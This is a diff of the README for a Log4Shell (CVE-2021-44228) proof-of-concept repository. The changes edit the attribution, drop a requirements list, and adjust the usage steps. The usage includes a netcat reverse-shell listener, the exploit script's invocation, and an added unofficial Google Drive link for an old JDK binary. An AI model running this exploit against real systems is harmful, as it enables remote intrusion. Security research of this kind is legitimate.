@@ -1,5 +1,5 @@
 # log4j-shell-poc
-#Collab of https://github.com/christophetd/log4shell-vulnerable-app and https://github.com/kozmer/log4j-shell-poc
+https://github.com/kozmer/log4j-shell-poc
 
 A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability. <br><br>
 
@@ -8,10 +8,6 @@ Recently there was a new vulnerability in log4j, a java logging library that is 
 In this repository we have made and example vulnerable application and proof-of-concept (POC) exploit of it.
 
 
-A#### Requirements:
-The following python packages are required by poc.py
-* `colorama`
-* `argparse`
 
 #### Usage:
 
@@ -23,7 +19,8 @@ nc -lvnp 4545
 **Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory.
 
 ```py
-$ python3 poc.py --userip localhost --webport 8000 --lport 9001
+$pip3 install -r requirements.txt
+$ python3 poc.py --userip localhost --webport 8000 --lport 4545
 
 [!] CVE: CVE-2021-44228
 
@@ -73,7 +70,10 @@ Scroll down to `8u20` and download the appropriate files for your operating syst
 Once you have downloaded and extracted the archive, you can find `java` and a few related binaries in `jdk1.8.0_20/bin`.<br>
 **Note:** Please make sure to extract the jdk folder into this repository with the same name in order for it to work.
 
-```
+You can also download it from here
+
+https://drive.google.com/file/d/1Ih9_AnHiHx6dwfCUcjyc7DF8p9pzoAHl/view?usp=sharing
+
 ❯ tar -xf jdk-8u20-linux-x64.tar.gz
 
 ❯ ./jdk1.8.0_20/bin/java -version
